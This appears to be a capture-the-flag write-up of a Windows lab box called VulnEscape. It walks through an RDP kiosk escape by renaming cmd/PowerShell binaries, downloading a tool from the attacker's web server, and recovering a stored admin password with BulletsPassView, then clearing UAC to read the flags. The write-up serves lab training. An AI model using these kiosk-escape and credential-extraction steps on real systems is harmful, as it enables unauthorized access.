---
title: VulnEscape - Easy
date: 2026-11-07 00:00:00 +0800 
categories: [Vulnlab, Box]
image:
    path: vulnescape.jpg
layout: post 
media_subpath: /assets/posts/vulnescape
---

VulnEscape is an Easy Difficulty Windows machine that features the Remote Desktop Server service running on its default port. Users can connect to the machine over RDP and login as KioskUser0 without a password. The target environment is restricted, however, by abusing the file:// scheme in Microsoft Edge, users can browse the file system. Further exploitation allows users to bypass the system restrictions and open a PowerShell window. Enumeration of the file system reveals a folder which contains a profile for an application called Remote Desktop Plus. This profile can be loaded in the application and the password in this profile can be extracted by using a second application called BulletsPassView. The extracted password can be used to start a session as the admin user and further bypass of the User Access Controls in place allows attackers to read the root flag.

This box is from Vulnlab but played on Hackthebox.

```terminal
Me > 10.10.14.74
Target > 10.129.234.51
```

## Foothold

```terminal
nmap 10.129.234.51 -sV -sC -v -p- -oN nmap.txt

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-07T14:30:29+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2026-11-07T14:30:24+00:00
| ssl-cert: Subject: commonName=Escape
| Issuer: commonName=Escape
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-06T14:25:37
| Not valid after:  2027-05-08T14:25:37
| MD5:     ecd9 c494 02b2 8147 4a0f 6f9d 8dd8 d482
| SHA-1:   5314 03e9 efa1 d887 e45a 01b0 944a 31ab b824 d742
|_SHA-256: 6542 87f7 bce6 b8dc 8101 e8d6 a109 5100 e6c4 7f7b 4eb2 f998 7066 4f1a 6ee7 d6c4
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see only 1 port open. That being rdp. We also see some names so we know we are working with a AD enviorment. We can try to connect to the box. Rdp needs credentials often but we can still try. It will ask for the domain and it seems like the domain is gonna be Escape.vl

```terminal
┌──(songbird㉿kali)-[~]
└─$ xfreerdp3 /v:10.129.234.51 /dynamic-resolution /sec:tls /tls:seclevel:0 /cert:ignore
[09:43:21:150] [10277:00002827] [INFO][com.freerdp.client.x11] - [xf_pre_connect]: No user name set. - Using login name: songbird
[09:43:21:152] [10277:00002827] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]:     : keycode: 0x08 -> no RDP scancode found
[09:43:21:152] [10277:00002827] [WARN][com.freerdp.client.x11] - [load_map_from_xkbfile]: ZEHA: keycode: 0x5d -> no RDP scancode found
Domain:          Escape.vl
Password:        
```

It works but we get a error.

![VulnEscape](vulnescape1.png)

It prompts us to login as KioskUser0 without a password. 

```terminal
┌──(songbird㉿kali)-[~/Desktop/vulnescape]
└─$ nxc rdp 10.129.234.51 -u KioskUser0 -p '' 
RDP         10.129.234.51   3389   ESCAPE           [*] Windows 10 or Windows Server 2016 Build 19041 (name:ESCAPE) (domain:Escape) (nla:False)
RDP         10.129.234.51   3389   ESCAPE           [+] Escape\KioskUser0: (Pwn3d!)
```

We can now use xfreerdp3 to log in.

```terminal
 xfreerdp3 /v:10.129.234.51 /u:KioskUser0 /p: /dynamic-resolution /sec:nla /cert:ignore
```

We get prompted the same thing as before.

![VulnEscape](vulnescape2.png)

If we click on the text we get prompted to a kiosk. We can press around but nothing happens. If we press the windows symbol keyboard we get a menu.

![VulnEscape](vulnescape3.png)

We can then type cmd to try to launch cmd.exe but this fails. Edge is the next target. I used it before to get a cmd.exe.

![VulnEscape](vulnescape4.png)

We will get prompted the usual start up stuff from microsoft when we open edge for the first time. After clicking threw that we land on a normal browser start.

![VulnEscape](vulnescape5.png)

We then can launch cmd.exe from the download menu.

![VulnEscape](vulnescape6.png)

Well I dont speak that, I think its korean but that looks like a error / block. We can still list the directories.

![VulnEscape](vulnescape7.png)

We can try to open the powershell.exe instead.

![VulnEscape](vulnescape8.png)

Same error. So whats really happning. We can try to translate this message. Should probaly have done this from the start.

![VulnEscape](vulnescape9.png)

So its just blocking the request. We can try to avoid this hardning. Lets open up the download folder.

![VulnEscape](vulnescape10.png)

If we click on powershell or cmd (focusing it), We can then press F2 to rename the file.

![VulnEscape](vulnescape11.png)

We get the same error. We can try to rename to something we can open as KioskUser0. We have been running edge all the time so lets rename the binary to that.
Edge is called msedge.exe but we dont want to keep the .exe part. So we change it to msedge.

![VulnEscape](vulnescape12.png)

Running that binary works. We get a shell.

![VulnEscape](vulnescape13.png)

## User

Also dont forget to grab the user flag.

```terminal
PS C:\Users\kioskUser0\Desktop> type user.txt
2aa2c19e4045bdabb485edbdf1271590
```

Checking netstat reveals a active directory and more ports we havent discovered yet.

```terminal
PS C:\Users> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       924
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       64
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1180
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       692
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       552
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       372
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       364
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       672
  TCP    10.129.234.51:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.234.51:3389     10.10.14.74:43246      ESTABLISHED     64
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       924
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       64
  TCP    [::]:49664             [::]:0                 LISTENING       692
  TCP    [::]:49665             [::]:0                 LISTENING       552
  TCP    [::]:49666             [::]:0                 LISTENING       372
  TCP    [::]:49667             [::]:0                 LISTENING       364
  TCP    [::]:49668             [::]:0                 LISTENING       672
  UDP    0.0.0.0:123            *:*                                    1148
  UDP    0.0.0.0:3389           *:*                                    64
  UDP    0.0.0.0:5050           *:*                                    1180
  UDP    0.0.0.0:5353           *:*                                    3432
  UDP    0.0.0.0:5353           *:*                                    788
  UDP    0.0.0.0:5353           *:*                                    788
  UDP    0.0.0.0:5353           *:*                                    3432
  UDP    0.0.0.0:5353           *:*                                    1372
  UDP    0.0.0.0:5355           *:*                                    1372
  UDP    0.0.0.0:62902          *:*                                    1372
  UDP    0.0.0.0:64447          *:*                                    1372
  UDP    10.129.234.51:137      *:*                                    4
  UDP    10.129.234.51:138      *:*                                    4
  UDP    10.129.234.51:1900     *:*                                    4792
  UDP    10.129.234.51:59901    *:*                                    4792
  UDP    127.0.0.1:1900         *:*                                    4792
  UDP    127.0.0.1:58398        *:*                                    364
  UDP    127.0.0.1:59902        *:*                                    4792
  UDP    [::]:123               *:*                                    1148
  UDP    [::]:3389              *:*                                    64
  UDP    [::]:5353              *:*                                    788
  UDP    [::]:5353              *:*                                    3432
  UDP    [::]:5353              *:*                                    1372
  UDP    [::]:5355              *:*                                    1372
  UDP    [::]:62902             *:*                                    1372
  UDP    [::]:64447             *:*                                    1372
  UDP    [::1]:1900             *:*                                    4792
  UDP    [::1]:59900            *:*                                    4792
  UDP    [fe80::3a22:29d9:da2b:6c46%14]:1900  *:*                                    4792
  UDP    [fe80::3a22:29d9:da2b:6c46%14]:59899  *:*                                    4792
```

Checking the / reveals a secret folder.

```terminal
  PS C:\> dir -force


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-          2/4/2024  12:52 AM                $Recycle.Bin
d--h--         6/24/2025   8:23 AM                $WinREAgent
d--hsl          2/3/2024  11:32 AM                Documents and Settings
d-----          2/3/2024   3:11 AM                inetpub
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---         4/10/2025  11:29 PM                Program Files
d-r---          2/3/2024   3:03 AM                Program Files (x86)
d--h--         6/24/2025   8:06 AM                ProgramData
d--hs-         10/1/2024  11:40 PM                Recovery
d--hs-         6/16/2025   4:42 AM                System Volume Information
d-r---          2/3/2024   3:43 AM                Users
d-----         6/24/2025   1:24 PM                Windows
d--h--          2/3/2024   3:05 AM                _admin
-a-hs-          2/4/2024   1:35 AM           8192 DumpStack.log
-a-hs-         11/7/2026   6:25 AM           8192 DumpStack.log.tmp
-a-hs-         10/1/2024  11:48 PM     2093002752 hiberfil.sys
-a-hs-         11/7/2026   6:25 AM     1476395008 pagefile.sys
-a-hs-         11/7/2026   6:25 AM       16777216 swapfile.sys
```

Checking it out reveals.

```terminal
  PS C:\_admin> dir


    Directory: C:\_admin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/3/2024   3:04 AM                installers
d-----          2/3/2024   3:05 AM                passwords
d-----          2/3/2024   3:05 AM                temp
-a----          2/3/2024   3:03 AM              0 Default.rdp
-a----          2/3/2024   3:04 AM            574 profiles.xml


PS C:\_admin> type .\profiles.xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
PS C:\_admin>
```

We can check the users on the box.

```terminal
PS C:\_admin> net user

User accounts for \\ESCAPE

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount
Guest                    kioskUser0               WDAGUtilityAccount
The command completed successfully.
```

There is a non default user called admin. This is intresting. Checking around we find a rdp.exe binary


```terminal
PS C:\Program Files (x86)> dir 


    Directory: C:\Program Files (x86)


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:31 AM                Common Files
d-----         6/24/2025   1:19 PM                Internet Explorer
d-----          2/3/2024   3:14 AM                Microsoft
d-----         12/7/2019   1:31 AM                Microsoft.NET
d-----          2/3/2024   3:03 AM                Remote Desktop Plus
d-----         6/24/2025  10:10 AM                Windows Defender
d-----          2/3/2024   3:07 AM                Windows Mail
d-----         6/24/2025  10:10 AM                Windows Media Player
d-----         6/24/2025   1:19 PM                Windows Multimedia Platform
d-----         12/7/2019   1:50 AM                Windows NT
d-----         6/24/2025  10:10 AM                Windows Photo Viewer
d-----         6/24/2025   1:19 PM                Windows Portable Devices
d-----         12/7/2019   1:31 AM                WindowsPowerShell


PS C:\Program Files (x86)> cd '.\Remote Desktop Plus\'
PS C:\Program Files (x86)\Remote Desktop Plus> dir


    Directory: C:\Program Files (x86)\Remote Desktop Plus


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/13/2018  10:47 PM         267264 rdp.exe


PS C:\Program Files (x86)\Remote Desktop Plus> .\rdp.exe
```

It prompts a menu. We can import a profile. Seems fitting for our config.xml we found before. We can only upload from download folder. So lets copy it first to there.

```terminal
PS C:\Program Files (x86)\Remote Desktop Plus> copy C:\_admin\profiles.xml C:\Users\kioskUser0\Downloads\
PS C:\Program Files (x86)\Remote Desktop Plus> dir C:\Users\kioskUser0\Downloads\


    Directory: C:\Users\kioskUser0\Downloads


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         11/7/2026   7:00 AM         289792 cmd.exe
-a----         11/7/2026   7:08 AM         455680 msedge.exe
-a----          2/3/2024   3:04 AM            574 profiles.xml
```

Now lets use it.

![VulnEscape](vulnescape14.png)

We need to press Manage profiles... -> Import and export -> Use the one in the download folder that we just copied. 

We can the use the profile admin.

![VulnEscape](vulnescape15.png)

Searching for ways to uncover the Password reveals a tool called. [BulletsPassView](https://www.nirsoft.net/utils/bullets_password_view.html#google_vignette)

We need to transfer the tool to the target now.

```terminal
PS C:\Program Files (x86)\Remote Desktop Plus> mkdir C:\temp1


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         11/7/2026   8:20 AM                temp1


PS C:\Program Files (x86)\Remote Desktop Plus> cp .\rdp.exe C:\temp1\
PS C:\Program Files (x86)\Remote Desktop Plus> cd C:\temp1\
PS C:\temp1> dir


    Directory: C:\temp1


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/13/2018  10:47 PM         267264 rdp.exe
```

Now lets start copy the bulletspassview.exe to our machine and start a webserver

```terminal
──(songbird㉿kali)-[~/Desktop/vulnescape]
└─$ cp /home/songbird/Downloads/bulletspassview-x64.zip .                                                                                                                                                                                   

┌──(songbird㉿kali)-[~/Desktop/vulnescape]
└─$ unzip bulletspassview-x64.zip                                                                                                                                                                                                           
Archive:  bulletspassview-x64.zip
  inflating: BulletsPassView.exe     
  inflating: BulletsPassView.chm     
  inflating: readme.txt              

┌──(songbird㉿kali)-[~/Desktop/vulnescape]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now on target machine.

```terminal
PS C:\temp1> wget http://10.10.14.74/BulletsPassView.exe -O BulletsPassView.exe
PS C:\temp1> dir


    Directory: C:\temp1


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         11/7/2026   8:24 AM          98400 BulletsPassView.exe
-a----         3/13/2018  10:47 PM         267264 rdp.exe
```

I tried alot here but it did not work with anything. It never revealed the password but we keep going. I thought mabey it could not read the files so I changed the directory to downloads instead. (This was not the error)

```terminal
PS C:\Users\kioskUser0\Downloads> cp C:\temp1\BulletsPassView.exe C:\Users\kioskUser0\Downloads
```

I found the error I have been doing. 

![VulnEscape](vulnescape16.png)

Its really important not to exit this Edit profile menu just go back to the powershell and run the BulletsPassView.exe.

![VulnEscape](vulnescape17.png)

We got the cleartext password for admin now. admin:Twisting3021
This took alot more time then it its suppose to be. 

```terminal
┌──(songbird㉿kali)-[~/Desktop/vulnescape]
└─$ nxc rdp 10.129.234.51 -u admin -p Twisting3021
RDP         10.129.234.51   3389   ESCAPE           [*] Windows 10 or Windows Server 2016 Build 19041 (name:ESCAPE) (domain:Escape) (nla:False)
RDP         10.129.234.51   3389   ESCAPE           [+] Escape\admin:Twisting3021 (Pwn3d!)
```

But trying to use rdp, we meet a error. We have the right credentials but the admin user is not allowed to rdp in.
We can use Runas or RunasCs to switch to the admin user. Im using Runas as its easier here.  

```terminal
PS C:\Users\kioskUser0\Downloads> runas /user:admin powershell
Enter the password for admin:
Attempting to start powershell as user "ESCAPE\admin" ...
```

We get a new shell as admin.

```terminal
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
escape\admin
```

Checking the admin account we find out its a administrator group.

```terminal
PS C:\Windows\system32> net user admin
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/3/2024 2:45:02 AM
Password expires             Never
Password changeable          2/3/2024 2:45:02 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/7/2026 9:07:28 AM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

But trying to view the flag in C:\Users\Administrator fails. We dont have permission.

```terminal
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

We dont have the full list of privileges either. So its probaly UAC blocking us. "User Account Control (UAC) is a security feature in Microsoft Windows that helps prevent unauthorized or accidental changes to your computer". But we have gui so we can just try to run as administrator and click yes. 

```terminal
start-process powershell.exe -verb runas
```

Using that command makes a popup. 

![VulnEscape](vulnescape18.png)

Right button is yes and Left button is no.

We dont need to translate this.

```terminal
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
escape\admin
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

## Root

Now that looks like it. Lets get the root flag.

```terminal
PS C:\Users\Administrator\Desktop> type .\root.txt
72252700882c814bc42cebce27e5eb42
```

Pwned!

![VulnEscape](vulnescape19.png)

